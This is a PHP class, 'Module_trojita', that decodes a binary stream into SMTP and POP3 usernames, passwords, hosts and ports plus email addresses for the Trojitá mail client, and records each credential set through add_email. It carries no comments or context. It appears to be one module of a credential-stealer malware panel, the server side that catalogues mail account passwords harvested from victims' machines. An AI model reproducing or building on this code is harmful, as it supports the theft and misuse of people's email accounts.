<?php
class Module_trojita extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
				$stream = new Stream($Data, strlen($Data));
				
				$SMTPUser = $SMTPPass = $SMTPHost = $SMTPPort = $POPUser = $POPPass = $POPHost = $POPPort = '';
				while(TRUE)
				{
					$Type = $stream->GetDWORD();
					if($Type === NULL)
						break;
					
					if($Type == 0)
					{
						$SMTPUser = $stream->getSTRING_();
						$SMTPPass = $stream->getSTRING_();
						$SMTPHost = $stream->getSTRING_();
						$SMTPPort = $stream->getSTRING_();
					}
					else if($Type == 1)
					{
						$POPUser = $stream->getSTRING_();
						$POPPass = $stream->getSTRING_();
						$POPHost = $stream->getSTRING_();
						$POPPort = $stream->GetDWORD();
					}
					else if($Type == 2)
					{
						while(TRUE)
						{
							$Email = $stream->getSTRING_();
							if($Email == NULL)
								break;
							
							if((strlen($POPUser) && strlen($POPPass)))
							{
								$this->add_email($Email, 'pop3', $POPHost, $POPPort, $POPUser, $POPPass);
							}
							
							if(strlen($SMTPUser) && strlen($SMTPPass))
							{
								$this->add_email($Email, 'smtp', $SMTPHost, $SMTPPort, $SMTPUser, $SMTPPass);
							}
						}
						break;
					}
					else
						break;
				}
			
				$stream = NULL;
				
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

